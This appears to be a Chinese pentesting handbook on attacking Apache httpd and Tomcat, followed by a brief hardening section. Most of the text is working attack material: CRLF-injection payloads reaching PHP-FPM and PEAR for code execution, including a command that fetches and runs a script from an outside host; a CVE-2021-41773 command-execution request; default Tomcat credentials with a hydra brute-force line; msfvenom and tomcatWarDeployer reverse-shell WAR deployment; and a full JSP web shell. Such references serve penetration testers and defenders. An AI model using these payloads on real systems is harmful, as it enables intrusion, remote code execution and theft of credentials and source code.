---
attack_surface: [配置缺陷, 协议解析差异, 认证/授权绕过, 注入类, 信息泄露]
impact: [远程代码执行, 信息泄露, 权限提升, 身份伪造]
risk_level: 严重
prerequisites:
  - Apache HTTP Server 基础架构理解
  - HTTP/1.1 协议基础
related_techniques:
  - http-request-smuggling
  - cache-poisoning
  - php-code-execution-via-htaccess
  - ssrf
  - path-traversal
difficulty: 高级
tools:
  - curl
  - Burp Suite
  - nmap
  - AJPFuzzer
  - Metasploit
---

# Apache — 攻击与防御技术手册

> 关联文档：[HTTP Request Smuggling](../../Proxies/HTTP%20Request%20Smuggling/README.md) · [Cache Poisoning](../../Proxies/Cache%20Poisoning%26Cache%20Deception/README.md) · [SSRF](../../User%20input/Reflected%20Values/SSRF/README.md) · [File Inclusion/Path Traversal](../../User%20input/Reflected%20Values/File%20Inclusion-Path%20Traversal/README.md) · [File Upload](../../Files/File%20Upload/README.md)

---

# 0x01 信息收集与枚举

## 1.1 Apache HTTP Server 版本识别

通过响应头 `Server` 字段和错误页面特征识别 Apache 版本：

```bash
curl -sI https://target/ | grep -i "server"
```

已知版本相关的漏洞汇总见 [Apache HTTP Server 2.4 vulnerabilities](https://httpd.apache.org/security/vulnerabilities_24.html)。

## 1.2 高价值 Handler 端点枚举

在深入 Rewrite 规则之前，优先检查以下内置 handler 端点——它们能直接暴露 Apache 特定的攻击入口。

### 1.2.1 `/server-status`

`/server-status` 和 `/server-status?auto` 可能暴露当前请求、客户端 IP、虚拟主机和 Worker 状态。当 `ExtendedStatus On` 时，常能恢复内部路径、管理 URL 或嵌入在请求行中的令牌。

### 1.2.2 `/server-info`

`/server-info` 接受查询参数 `?config`、`?list`、`?server`、`?providers` 或 `?<module>`，可导出解析后的配置，包括 `DocumentRoot`、`ProxyPass`、`ScriptAlias`、`SetHandler`、认证规则、后端主机和已加载模块。

注意：`server-info` **不列出 `.htaccess` 指令**，因此此处缺少规则不代表目录安全。

```bash
curl -sk https://target/server-info?config | grep -E 'ProxyPass|ProxyPassMatch|SetHandler|AddHandler|AddType|ScriptAlias|ExecCGI|DAV On|AllowOverride'
```

### 1.2.3 `/balancer-manager`

可泄露 `BalancerMember` 后端、路由、`stickysession` 名称和 Worker 状态。如果暴露写权限，可能能够禁用后端或修改权重。

### 批量探测

```bash
for u in /server-status /server-status?auto /server-info /server-info?config /server-info?list /balancer-manager; do
  echo "### $u"
  curl -sk -i "https://target$u" | sed -n '1,40p'
done
```

如果可上传或编辑 `.htaccess`，当 `AllowOverride FileInfo` 允许使用 `SetHandler` 时，`mod_status` 和 `mod_info` 再次变得有趣。

## 1.3 可执行 PHP 扩展检测

检查 Apache 实际执行哪些 PHP 扩展：

```bash
grep -R -B1 "httpd-php" /etc/apache2
```

常见配置文件位置：

```
/etc/apache2/mods-available/php5.conf
/etc/apache2/mods-enabled/php5.conf
/etc/apache2/mods-available/php7.3.conf
/etc/apache2/mods-enabled/php7.3.conf
```

---

# 0x02 配置利用与权限绕过

## 2.1 .htaccess ErrorDocument LFI（ap_expr）

如果攻击者能控制某目录的 `.htaccess` 且 `AllowOverride` 包含 `FileInfo`，可利用 ap_expr 的 `file()` 函数将 404 响应转化为任意本地文件读取。

**条件：**
- Apache 2.4（ap_expr 默认启用）
- 虚拟主机/目录允许 `.htaccess` 设置 `ErrorDocument`（`AllowOverride FileInfo`）
- Apache Worker 用户对目标文件有读权限

**.htaccess Payload：**

```apache
# 可选标记头，标识租户/请求路径
Header always set X-Debug-Tenant "demo"
# 将目录下所有 404 响应的内容替换为指定文件系统路径的内容
ErrorDocument 404 %{file:/etc/passwd}
```

**触发（请求目录下任意不存在的路径）：**

```bash
curl -s http://target/~user/does-not-exist | sed -n '1,20p'
```

**注意事项与技巧：**
- 仅绝对路径有效，内容作为 404 响应体返回
- 有效读权限为 Apache 用户（通常是 `www-data`/`apache`），默认无法读取 `/root/*` 或 `/etc/shadow`
- 即使 `.htaccess` 属主为 root，如果父目录属主为租户且允许重命名，可通过 SFTP/FTP 先重命名原 `.htaccess` 再上传恶意版本：
  - `rename .htaccess .htaccess.bk`
  - `put` 恶意 `.htaccess`
- 利用此技术读取 `DocumentRoot` 下的应用源码或虚拟主机配置路径获取密钥（数据库凭据、API Key 等）

## 2.2 ACL 绕过（Filename Confusion）

即使配置了如下访问控制：

```xml
<Files "admin.php">
    AuthType Basic
    AuthName "Admin Panel"
    AuthUserFile "/etc/apache2/.htpasswd"
    Require valid-user
</Files>
```

仍可绕过。因为 PHP-FPM 默认接收以 `.php` 结尾的 URL，如 `http://server/admin.php%3Fooo.php`。PHP-FPM 会移除 `?` 之后的内容，因此请求实际加载的是 `/admin.php`，绕过了认证限制。

---

# 0x03 Filename Confusion 攻击

这类攻击由 [Orange Tsai 在 2024 年 Black Hat 演讲中系统化提出](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)，核心思想是滥用 Apache 数十个模块之间不完全同步的协作方式，使某些模块修改非预期的数据，导致后续模块产生漏洞。

## 3.1 路径截断（Truncation）

`mod_rewrite` 会截断 `r->filename` 中 `?` 字符之后的内容（[源码](https://github.com/apache/httpd/blob/2.4.58/modules/mappers/mod_rewrite.c#L4141)）。虽然大多数模块将 `r->filename` 视为 URL 处理，但在某些场景下它会被视为文件路径，导致问题。

**示例：**

```bash
RewriteEngine On
RewriteRule "^/user/(.+)$" "/var/user/$1/profile.yml"

# 预期行为
curl http://server/user/orange
# → 输出 /var/user/orange/profile.yml

# 攻击
curl http://server/user/orange%2Fsecret.yml%3F
# → 输出 /var/user/orange/secret.yml
```

## 3.2 RewriteFlag 误导分配

以下 Rewrite 规则中，只要 URL 以 `.php` 结尾就被视为 PHP 执行。攻击者可发送 `?` 之后以 `.php` 结尾的 URL，实际路径指向包含恶意 PHP 代码的图片文件：

```bash
RewriteEngine On
RewriteRule  ^(.+\.php)$  $1  [H=application/x-httpd-php]

# 攻击者上传含 PHP 代码的 GIF 文件
curl http://server/upload/1.gif
# GIF89a <?=`id`;>

# 使服务器以 PHP 执行该文件
curl http://server/upload/1.gif%3fooo.php
# GIF89a uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 3.3 CGI/PHP 源码泄露

### 泄露 CGI 源码

在末尾添加 `%3F` 即可泄露 CGI 模块源码：

```bash
curl http://server/cgi-bin/download.cgi
# → download.cgi 的处理结果

curl http://server/html/usr/lib/cgi-bin/download.cgi%3F
# → #!/usr/bin/perl
# → use CGI;
# → ...
# → download.cgi 源码
```

### 泄露 PHP 源码

如果服务器有多个域名且其中一个为静态域名，可利用其遍历文件系统泄露 PHP 代码：

```bash
# 从 static.local 域名泄露 www.local 的 config.php
curl http://www.local/var/www.local/config.php%3F -H "Host: static.local"
# → config.php 源码
```

---

# 0x04 DocumentRoot Confusion 攻击

## 4.1 双重文件系统访问

Apache 的一个有趣行为：Rewrite 规则会同时尝试从 `DocumentRoot` 和文件系统根目录访问文件。

```bash
DocumentRoot /var/www/html
RewriteRule  ^/html/(.*)$   /$1.html
```

请求 `https://server/about.html` 会同时检查：
- `/var/www/html/about.html`（DocumentRoot 下）
- `/about.html`（文件系统根目录下）

这一行为可被滥用以访问文件系统中的任意文件。

## 4.2 本地 Gadget 利用

默认情况下，Apache HTTP Server 的[配置模板](https://github.com/apache/httpd/blob/trunk/docs/conf/httpd.conf.in#L115)禁止文件系统根目录访问：

```xml
<Directory />
    AllowOverride None
    Require all denied
</Directory>
```

然而，**Debian/Ubuntu** [默认允许 `/usr/share`](https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/apache2.conf.in/#L165)：

```xml
<Directory /usr/share>
    AllowOverride None
    Require all granted
</Directory>
```

因此在这些发行版中可滥用 `/usr/share` 下的文件。

### 4.2.1 信息泄露 Gadget

- Apache HTTP Server + **websocketd** → `/usr/share/doc/websocketd/examples/php/dump-env.php` 泄露敏感环境变量
- Nginx 或 Jetty 默认 Web 根目录位于 `/usr/share` 下：
  - `/usr/share/nginx/html/`
  - `/usr/share/jetty9/etc/`
  - `/usr/share/jetty9/webapps/`

### 4.2.2 XSS Gadget

- Ubuntu Desktop 安装 **LibreOffice** 时，利用帮助文件的语言切换功能可触发 XSS。操纵 `/usr/share/libreoffice/help/help.html` 的 URL 可通过不安全的 RewriteRule 重定向到恶意页面或旧版本

### 4.2.3 LFI Gadget

安装 PHP 或特定前端包后的可利用文件：

- `/usr/share/doc/libphp-jpgraph-examples/examples/show-source.php`
- `/usr/share/javascript/jquery-jfeed/proxy.php`
- `/usr/share/moodle/mod/assignment/type/wims/getcsv.php`

### 4.2.4 SSRF Gadget

- `/usr/share/php/magpierss/scripts/magpie_debug.php` — MagpieRSS 的调试脚本，可轻松创建 SSRF

### 4.2.5 RCE Gadget

存在大量潜在 RCE 入口，例如过时的 **PHPUnit** 或 **phpLiteAdmin**，可被利用执行任意代码。

## 4.3 Symlink 越狱（Jailbreak）

通过 `/usr/share` 中已安装软件创建的符号链接可逃逸到外部目录：

- **Cacti Log**: `/usr/share/cacti/site/` → `/var/log/cacti/`
- **Solr Data**: `/usr/share/solr/data/` → `/var/lib/solr/data`
- **Solr Config**: `/usr/share/solr/conf/` → `/etc/solr/conf/`
- **MediaWiki Config**: `/usr/share/mediawiki/config/` → `/var/lib/mediawiki/config/`
- **SimpleSAMLphp Config**: `/usr/share/simplesamlphp/config/` → `/etc/simplesamlphp/`

利用 Symlink 甚至可在 Redmine 中实现 RCE。

---

# 0x05 Handler Confusion 攻击

此攻击利用 `AddHandler` 和 `AddType` 指令之间的功能重叠——两者都可用于启用 PHP 处理。原本它们影响不同字段（`r->handler` 和 `r->content_type`），但由于历史遗留代码，Apache 在特定条件下将它们互换使用。在 `server/config.c#L420` 中，如果执行 `ap_run_handler()` 之前 `r->handler` 为空，服务器**使用 `r->content_type` 作为 handler**，使 `AddType` 和 `AddHandler` 实际上等效。

## 5.1 AddHandler vs AddType 机制混淆

| 指令 | 原始影响字段 | 实际效果 |
|------|------------|---------|
| `AddHandler application/x-httpd-php .php` | `r->handler` | 设置 handler |
| `AddType application/x-httpd-php .php` | `r->content_type` | 当 handler 为空时同样设置 handler |

## 5.2 覆盖 Handler 泄露 PHP 源码

[ZeroNights 2021 演讲](https://web.archive.org/web/20210909012535/https://zeronights.ru/wp-content/uploads/2021/09/013_dmitriev-maksim.pdf)中展示：客户端发送不正确的 `Content-Length` 可使 Apache 错误地返回 PHP 源码。原因在于 ModSecurity 与 APR (Apache Portable Runtime) 之间的错误处理导致双重响应，覆盖 `r->content_type` 为 `text/html`。由于 ModSecurity 未正确处理返回值，导致返回 PHP 代码而非执行。

## 5.3 调用任意 Handler

如果攻击者能控制服务器响应中的 `Content-Type` 头，就能调用任意模块 handler。但到攻击者能控制该头时，大多数请求处理已完成。然而，可利用 `Location` 头**重启请求处理**——当返回 `Status` 为 200 且 `Location` 头以 `/` 开头时，响应被视为 Server-Side Redirection。

此行为基于 [RFC 3875 Section 6.2.2](https://datatracker.ietf.org/doc/html/rfc3875)（CGI 规范）定义的 Local Redirect Response：

> CGI 脚本可在 Location 头中返回本地资源的 URI 路径和查询字符串（'local-pathquery'），指示服务器使用指定路径重新处理请求。

**攻击前提（满足其一即可）：**
- CGI 响应头中存在 CRLF 注入
- 对响应头有完全控制权的 SSRF

### 5.3.1 信息泄露（访问受保护的 server-status）

`/server-status` 通常仅限本地访问：

```xml
<Location /server-status>
    SetHandler server-status
    Require local
</Location>
```

通过设置 `Content-Type: server-status` 和以 `/` 开头的 `Location` 头绕过：

```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo %0d%0a
Content-Type:server-status %0d%0a
%0d%0a
```

### 5.3.2 全 SSRF（mod_proxy）

重定向到 `mod_proxy` 访问任意协议和 URL：

```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo %0d%0a
Content-Type:proxy:
http://example.com/%3F
 %0d%0a
%0d%0a
```

注意：`X-Forwarded-For` 头会被添加，阻止访问云元数据端点。

### 5.3.3 本地 Unix Domain Socket 访问

访问 PHP-FPM 的本地 Unix Domain Socket 执行 `/tmp/` 中的 PHP 后门：

```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/tmp/ooo.php %0d%0a
%0d%0a
```

### 5.3.4 RCE（PEAR + PHP-FPM）

官方 [PHP Docker 镜像](https://hub.docker.com/_/php) 包含 PEAR（`Pearcmd.php`），可滥用以实现 RCE：

```
http://server/cgi-bin/redir.cgi?r=http://%0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}
orange.tw/x|perl
) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```

参见 [Docker PHP LFI Summary](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp)（Phith0n 编写）了解此技术的详细分析。

---

# 0x06 路径遍历与文件包含

## 6.1 CVE-2021-41773 — Apache 路径遍历

Apache HTTP Server 2.4.49 中的路径规范化缺陷，允许攻击者使用 URL 编码的路径遍历序列访问文件系统。

```bash
curl http://172.18.0.15/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh --data 'echo Content-Type: text/plain; echo; id; uname'
uid=1(daemon) gid=1(daemon) groups=1(daemon)
Linux
```

影响版本：**2.4.49**（CVE-2021-41773 在 2.4.50 中修复不完整，产生 CVE-2021-42013）。

## 6.2 Apache HTTPD 换行解析漏洞（CVE-2017-15715）

Apache HTTPD 在解析文件后缀时，如果文件名中包含换行符（`\x0a`），可能错误地将非 PHP 文件识别为 PHP 执行。

**条件：**
- Apache 配置了 `AddHandler` 或使用正则匹配文件后缀作为 PHP 执行
- 文件名中注入 `\x0a` 绕过正则匹配，但仍被 Apache 当作 PHP 执行

## 6.3 Apache HTTPD 多后缀解析

Apache HTTPD 支持文件拥有多个后缀，并为不同后缀执行不同指令。例如：

```apache
AddType text/html .html
AddLanguage zh-CN .cn
```

请求 `index.cn.html` 时返回中文 HTML 页面。

**安全风险：** 如果运维添加了 `.php` 处理器：

```apache
AddHandler application/x-httpd-php .php
```

则文件只要**含有 `.php`** 但不要求以 `.php` 结尾，即可被作为 PHP 执行。例如 `shell.php.jpg` 会被解析为 PHP。

---

# 0x07 AJP 协议攻击

## 7.1 AJP 协议基础

AJP (Apache JServ Protocol) 是有线协议，是 HTTP 协议的优化版本，用于独立 Web 服务器（如 Apache httpd）与 Tomcat 通信。AJP 比普通 HTTP 更有趣，因为后端**信任代理**设置内部请求元数据。

> ajp13 协议是面向数据包的。二进制格式比可读纯文本选择出于性能考虑。Web 服务器通过 TCP 连接与 Servlet 容器通信。为减少 Socket 创建的昂贵开销，Web 服务器尝试维持与 Servlet 容器的持久 TCP 连接，并为多个请求/响应循环复用连接。

**默认端口：** 8009

```
PORT     STATE SERVICE
8009/tcp open  ajp13
```

**关键审查点：** Tomcat Connector 属性 `address`、`secret`、`secretRequired` 和 `allowedRequestAttributesPattern`。

## 7.2 Ghostcat（CVE-2020-1938）— AJP LFI

Ghostcat 是一个 LFI 漏洞，允许读取 `WEB-INF/web.xml` 等文件，其中通常包含凭据。

**受影响版本：** Tomcat < 9.0.31、< 8.5.51、< 7.0.100

[Exploit-DB 利用代码](https://www.exploit-db.com/exploits/48143)

**补丁后变化：** 默认 AJP 部署变得更难攻击——Tomcat 默认要求 AJP secret，默认仅监听 loopback，并拒绝未知的转发请求属性（除非匹配 `allowedRequestAttributesPattern`）。但如仍可从非受信网络访问 8009 端口，应作为高价值目标对待。

## 7.3 AJP 枚举与信息收集

### 自动化扫描

```bash
nmap -sV --script ajp-auth,ajp-headers,ajp-methods,ajp-request -n -p 8009 <IP>

# 直接通过 AJP 请求特定路径并保存响应体
nmap -p 8009 --script ajp-request \
  --script-args 'path=/manager/html,method=GET,filename=ajp-manager.out' <IP>

# 检查自定义路径上的允许方法和头
nmap -p 8009 --script ajp-headers,ajp-methods \
  --script-args 'ajp-headers.path=/,ajp-methods.path=/manager/html' <IP>
```

### 手动 / 协议感知工具（AJPFuzzer）

[Doyensec AJPFuzzer](https://github.com/doyensec/ajpfuzzer) 用于构造 `ForwardRequest` 数据包、爆破 secret 或模糊测试请求属性：

```bash
# 复现 Ghostcat 风格的文件泄露
java -jar ajpfuzzer_v0.7.jar
connect <IP> 8009
forwardrequest 2 "HTTP/1.1" "/" 127.0.0.1 <TARGET_IP> <TARGET_IP> 8009 false \
  "Cookie:test=value" \
  "javax.servlet.include.path_info:/WEB-INF/web.xml,javax.servlet.include.servlet_path:/"
```

```bash
# 模糊测试 secret 处理或属性解析
java -jar ajpfuzzer_v0.7.jar
connect <IP> 8009
genericfuzz 2 "HTTP/1.1" "/" "127.0.0.1" "127.0.0.1" "127.0.0.1" 8009 false \
  "Cookie:AAAA=BBBB" \
  "secret:FUZZ" /tmp/ajp_secret_candidates.txt
```

## 7.4 Request Attributes 滥用

AJP 不仅是 "另一个端口的 HTTP"，协议可携带**受信任的请求属性**，如认证用户信息、TLS 详情、客户端证书材料和任意 `req_attribute` 名称/值对。

评估 AJP 暴露目标时，关注基于代理提供数据做安全决策的应用：

- `REMOTE_USER` / `remote_user`
- 客户端证书相关属性（`javax.servlet.request.X509Certificate`、cipher、key size、SSL session）
- 源地址 / 代理元数据（`AJP_LOCAL_ADDR`、`AJP_REMOTE_PORT`、`AJP_SSL_PROTOCOL`）
- 通过 `request.getAttribute()` 消费的自定义请求属性

现代 Tomcat 对未知转发属性返回 **403**，除非名称匹配 `allowedRequestAttributesPattern`，因此宽松的正则或旧版 Connector 配置值得深入调查。

## 7.5 HTTP → AJP Desync / 请求走私

即使端口 8009 不直接暴露，AJP 仍可通过 HTTP 反向代理（如 `mod_proxy_ajp`）访问。近期真实漏洞表明，**HTTP 前端和 AJP 后端可能对请求边界存在分歧**，将外部 HTTP Desync 转化为走私的 AJP 请求。

在 Apache httpd → Tomcat 架构的评估中，应测试经典 Desync 行为以及 AJP 特定的信任边界，尤其关注仅内部路径、受认证保护的管理端点和使用旧版 `mod_proxy_ajp` 的 Connector。

## 7.6 AJP 代理搭建

### Nginx + AJP 模块

编译带 AJP 模块的 Nginx：

```bash
git clone https://github.com/dvershinin/nginx_ajp_module.git
cd nginx-version
sudo apt install libpcre3-dev
./configure --add-module=`pwd`/../nginx_ajp_module --prefix=/etc/nginx --sbin-path=/usr/sbin/nginx --modules-path=/usr/lib/nginx/modules
make
sudo make install
nginx -V
```

Nginx 配置（`/etc/nginx/conf/nginx.conf`）：

```nginx
upstream tomcats {
    server <TARGET_SERVER>:8009;
    keepalive 10;
}
server {
    listen 80;
    location / {
        ajp_keep_conn on;
        ajp_pass tomcats;
    }
}
```

### Nginx Docker 快速部署

```bash
git clone https://github.com/ScribblerCoder/nginx-ajp-docker
cd nginx-ajp-docker
# 在 nginx.conf 中替换 TARGET-IP
docker build . -t nginx-ajp-proxy
docker run -it --rm -p 80:80 nginx-ajp-proxy
```

### Apache AJP 代理

```bash
a2enmod proxy proxy_ajp

# 基础 AJP 转发
ProxyPass / ajp://<TARGET_SERVER>:8009/
ProxyPassReverse / ajp://<TARGET_SERVER>:8009/

# 如果后端需要 AJP secret（现代 Tomcat/httpd 常见）
# ProxyPass / ajp://<TARGET_SERVER>:8009/ secret=<AJP_SECRET>
```

---

# 0x08 Apache Tomcat 攻击

## 8.1 信息收集与版本识别

Tomcat 通常运行在 **8080 端口**。

```bash
curl -s http://tomcat-site.local:8080/docs/ | grep Tomcat
```

## 8.2 Manager 应用枚举与爆破

`/manager` 和 `/host-manager` 目录名称可能被修改，需要爆破搜索。

### 默认凭据

`/manager/html` 允许上传部署 WAR 文件 → RCE，受 HTTP Basic 认证保护。常见凭据：

| 用户名 | 密码 |
|--------|------|
| admin | admin |
| tomcat | tomcat |
| admin | (空) |
| admin | s3cr3t |
| tomcat | s3cr3t |
| admin | tomcat |

### 爆破

```bash
hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager/html
```

Metasploit：

```bash
msf> use auxiliary/scanner/http/tomcat_mgr_login
```

对于 Tomcat 6 之前的版本，可使用用户枚举：

```bash
msf> use auxiliary/scanner/http/tomcat_enum
```

## 8.3 常见漏洞

### 8.3.1 密码回溯泄露

访问 `/auth.jsp` 在某些条件下可能在回溯中暴露密码。

### 8.3.2 示例脚本信息泄露与 XSS

Tomcat 4.x 至 7.x 包含的示例脚本存在信息泄露和 XSS 风险。应检查的路径：

```
/examples/jsp/num/numguess.jsp
/examples/jsp/dates/date.jsp
/examples/jsp/snp/snoop.jsp
/examples/jsp/error/error.html
/examples/jsp/sessions/carts.html
/examples/jsp/checkbox/check.html
/examples/jsp/colors/colors.html
/examples/jsp/cal/login.html
/examples/jsp/include/include.jsp
/examples/jsp/forward/forward.jsp
/examples/jsp/plugin/plugin.jsp
/examples/jsp/jsptoserv/jsptoservlet.jsp
/examples/jsp/simpletag/foo.jsp
/examples/jsp/mail/sendmail.jsp
/examples/servlet/HelloWorldExample
/examples/servlet/RequestInfoExample
/examples/servlet/RequestHeaderExample
/examples/servlet/RequestParamExample
/examples/servlet/CookieExample
/examples/servlet/JndiServlet
/examples/servlet/SessionExample
/tomcat-docs/appdev/sample/web/hello.jsp
```

### 8.3.3 路径遍历绕过

**`/..;/` 路径遍历（CVE-2007-1860 及变体）：**

在[某些 Tomcat 配置](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/)中，可使用 `/..;/` 访问受保护目录：

```
www.vulnerable.com/lalala/..;/manager/html
```

**参数绕过：**

```
http://www.vulnerable.com/;param=value/manager/html
```

**双 URL 编码绕过（CVE-2007-1860）：**

`mod_jk` 中的双 URL 编码路径遍历：

```
pathTomcat/%252E%252E/manager/html
```

## 8.4 WAR 文件部署 RCE

具备以下角色之一即可部署 WAR：**admin**、**manager**、**manager-script**。

凭据文件：`tomcat-users.xml`（常见路径：`/usr/share/tomcat9/etc/tomcat-users.xml`）

```bash
find / -name tomcat-users.xml 2>/dev/null
```

### 8.4.1 curl 部署

```bash
# 部署
curl --upload-file monshell.war -u 'tomcat:password' "http://localhost:8080/manager/text/deploy?path=/monshell"

# 卸载
curl "http://tomcat:Password@localhost:8080/manager/text/undeploy?path=/monshell"
```

### 8.4.2 Metasploit

```bash
use exploit/multi/http/tomcat_mgr_upload
msf exploit(multi/http/tomcat_mgr_upload) > set rhost <IP>
msf exploit(multi/http/tomcat_mgr_upload) > set rport <port>
msf exploit(multi/http/tomcat_mgr_upload) > set httpusername <username>
msf exploit(multi/http/tomcat_mgr_upload) > set httppassword <password>
msf exploit(multi/http/tomcat_mgr_upload) > exploit
```

### 8.4.3 MSFVenom

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST_IP> LPORT=<LPORT> -f war -o revshell.war
# 上传后访问 /revshell/
```

### 8.4.4 tomcatWarDeployer

```bash
git clone https://github.com/mgeeky/tomcatWarDeployer.git

# 反向 Shell
./tomcatWarDeployer.py -U <username> -P <password> -H <ATTACKER_IP> -p <ATTACKER_PORT> <VICTIM_IP>:<VICTIM_PORT>/manager/html/

# Bind Shell
./tomcatWarDeployer.py -U <username> -P <password> -p <bind_port> <victim_IP>:<victim_PORT>/manager/html/
```

### 8.4.5 clusterd

```bash
clusterd.py -i 192.168.1.105 -a tomcat -v 5.5 --gen-payload 192.168.1.6:4444 --deploy shell.war --invoke --rand-payload -o windows
```

### 8.4.6 手动 WebShell

创建 `index.jsp`：

```java
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>
```

```bash
mkdir webshell
cp index.jsp webshell
cd webshell
jar -cvf ../webshell.war *
# 上传 webshell.war 后访问 /webshell/
```

### 8.4.7 手动 WAR 打包（快速方法）

```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp
# 上传后访问 /backup/cmd.jsp
```

## 8.5 其他工具

- [ApacheTomcatScanner](https://github.com/p0dalirius/ApacheTomcatScanner) — Tomcat 综合扫描器
- [Pentest-Tomcat](https://github.com/simran-sankhala/Pentest-Tomcat) — Tomcat 渗透测试清单

---

# 0x09 新兴攻击面与审计要点

## 9.1 反向代理请求分割（RewriteRule [P] / ProxyPassMatch）

Apache 2.4.56 修复了一个关键的反向代理模式：宽泛的 `RewriteRule` 或 `ProxyPassMatch` 捕获攻击者控制的字节并将其重新注入代理请求目标。任何将 `$1`、`$2` 等反射到后端 URL 的配置都值得模糊测试。

**快速审计：**

```bash
grep -RInE 'RewriteRule.*\[.*P.*\]|ProxyPassMatch|SetHandler\s+"proxy:|SetHandler\s+proxy:' /etc/apache2 /usr/local/apache2/conf 2>/dev/null
```

**模糊测试 Payload：**
- `%0d%0a`（CRLF 注入）
- 编码的 `?`、`#` 或 `;`
- 重复斜杠和点段
- 可改变上游路由的路径/查询片段

如果发现上述模式，继续参考 [HTTP Request Smuggling](../../Proxies/HTTP%20Request%20Smuggling/README.md)。

## 9.2 UnsafeAllow3F / UnsafePrefixStat 标志

Apache 2.4.60 引入了两个选择性启用的 `mod_rewrite` 标志，实质上重新启用了 2024 年加固前的危险旧行为：

- **`UnsafeAllow3F`**：当请求包含编码的 `?`（`%3f`）且重写替换也包含字面 `?` 时，允许重写继续。这正是 `?`-based 截断 / handler confusion 技巧的模式。
- **`UnsafePrefixStat`**：允许以反向引用或变量开头且解析为文件系统路径的服务级替换，而不强制先使用安全的 DocumentRoot 前缀。这是路径逃逸和意外本地文件解析的危险模式。

**快速审计：**

```bash
grep -RInE 'UnsafeAllow3F|UnsafePrefixStat|RewriteRule' /etc/apache2 /usr/local/apache2/conf 2>/dev/null
```

如果发现这些标志，重新测试：
- 攻击者控制的捕获中 `%3f` 影响 RewriteRule 替换或 handler 选择
- 路径首段来自 `$1`、`%{ENV:*}`、`%{HTTP:*}` 等服务/虚拟主机级别的重写

## 9.3 Windows UNC / NTLM 强制认证

在 Windows 部署中，近期研究表明不安全路径处理可转化为对攻击者控制主机的出站 SMB 认证。当非受信输入到达 `mod_rewrite`、`ap_expr` 或 type-map 解析时尤其值得关注。

**关键条件：**
- `AllowEncodedSlashes On`
- Windows 上 `AllowEncodedSlashes On` + `MergeSlashes Off` 组合在 2.4.65 及更早版本中尤其危险
- Debian/Ubuntu 风格的 `AddHandler type-map var` 在 Windows 上也可使上传的 `.var` 文件变得有趣

**基本探测：**

```bash
curl http://server/%5C%5Cattacker-server/path/to
```

如果请求被接受且服务器是 Windows 平台，Apache 可能尝试解析 UNC 路径并强制向 `attacker-server` 发起 NTLM 认证。在实际内网环境中，应将其视为"不仅仅是 SSRF"——泄露的认证通常可链入 NTLM Relay。

如果存在文件上传且启用 `type-map` 支持，恶意 `.var` 文件（`URI` 指向 UNC 路径）可触发同类出站认证。

## 9.4 Request-controlled Content-Type + mod_headers

Apache 2.4.64 修复了一个小众但关键的配置类：如果 `mod_proxy` 已加载且 `mod_headers` 将攻击者控制的数据复制到 `Content-Type` 请求或响应头中，Apache 可被诱导向攻击者选择的 URL 发起出站代理请求。

**快速审计：**

```bash
grep -RInE '(RequestHeader|Header).*(Content-Type|Content-type)' /etc/apache2 /usr/local/apache2/conf 2>/dev/null
```

如果 `Content-Type` 值受请求数据影响，像在 CRLF / Header Injection 链中一样测试 `proxy:http://...`、`proxy:unix:/...|fcgi://...` 和本地 handler 名称。

## 9.5 2.4.64 RewriteCond expr Bug

如果指纹识别显示为 **Apache 2.4.64**，所有 **`RewriteCond expr`** 安全控制视为可疑：所有 `RewriteCond expr ...` 测试均评估为 **true**。重测 IP/Header/路径网关、否定条件、规范化规则和 "仅在代理时" 逻辑。

**快速审计：**

```bash
grep -RIn 'RewriteCond expr' /etc/apache2 /usr/local/apache2/conf 2>/dev/null
```

## 9.6 AddType Handler 映射回归风险

Handler Confusion 并非纯理论。Apache 2.4.60 和 2.4.61 存在回归：旧版基于 content-type 的 handler 映射（如 `AddType application/x-httpd-php .php`）在间接请求时可能泄露源码。Apache 2.4.62 修复了回归，但这仍是重要的渗透测试检查项，因为许多环境仍依赖旧版 `AddType` 映射。

**快速审计：**

```bash
grep -RInE 'AddType\s+application/x-httpd-php|AddType\s+.*x-httpd' /etc/apache2 /usr/local/apache2/conf 2>/dev/null
```

如果发现 `AddType` 而非 `SetHandler` / `AddHandler`，对比直接请求与通过内部重写、本地重定向或 `ErrorDocument` 链到达同一脚本的间接请求路径。寻找 PHP 被作为 `text/plain` / `text/html` 返回而非执行的情况。

---

# 0x0A 检测与防御

## 10.1 端点访问控制

```xml
# 限制敏感 handler 仅本地访问
<Location /server-status>
    SetHandler server-status
    Require local
</Location>

<Location /server-info>
    SetHandler server-info
    Require local
</Location>
```

## 10.2 文件系统访问限制

```xml
# 默认拒绝根目录访问
<Directory />
    AllowOverride None
    Require all denied
</Directory>

# 仅显式开放必要的目录
<Directory /var/www/html>
    AllowOverride FileInfo
    Require all granted
</Directory>
```

## 10.3 升级与加固

1. **保持 Apache 更新到最新稳定版本**（关注 [官方安全公告](https://httpd.apache.org/security/vulnerabilities_24.html)）
2. **避免使用 `AddType` 映射 handler**，始终使用 `SetHandler` 或 `AddHandler`
